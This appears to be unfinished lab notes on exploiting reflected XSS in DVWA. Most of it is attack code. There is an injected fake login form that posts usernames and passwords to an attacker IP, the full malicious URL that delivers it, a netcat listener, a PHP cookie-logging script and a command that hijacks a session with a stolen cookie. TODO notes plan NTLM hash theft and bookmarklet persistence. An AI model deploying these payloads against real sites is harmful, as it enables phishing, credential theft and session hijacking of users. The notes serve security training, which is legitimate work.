# Manual

TODO: Demonstrate how XSS can be leveraged by an attacker.

### Phishing via XSS

```html
<h3>Login</h3>
<form action=http://<attacker_IP>
Username:<br><input type="username" name="username"></br>
Password:<br><input type="password" name="password"></br>
<br><input type="submit" value="Logon"></br>
```

```html
http://dvwa.local/dvwa/vulnerabilities/xss_r/?name=<h3>Login</h3><form action=http://<attacker_IP> Username:<br><input type="username" name="username"></br> Password:<br><input type="password" name="password"></br> <br><input type="submit" value="Logon"></br>
```

```
$ sudo nc -lnvp 80
```

```php
<?php
$cookie = $_GET['cookie'];
$fp = fopen('cookies.txt', 'a+');
fwrite($fp, 'Cookie:' . $cookie . "\r\n");
fclose($fp);
?>
```

Open in debug console in any web browser. You can use an extension **Cookie Editor** if you prefer.

```
document.cookie = "<cookie_session>"
```

TODO: refer to the link to use responder to grab ntlm hashes on a windows target

TODO: Convince the user to click a link or button to add a bookmark using bookmarklet via XSS for persistence

---
## References

- [Computer Security Student (CSS): Reflected Cross Site Scripting Injection #1, Man-In-The-Middle Attack](http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson13/index.html)

- [Getting Creds via NTLMv2](https://0xdf.gitlab.io/2019/01/13/getting-net-ntlm-hases-from-windows.html)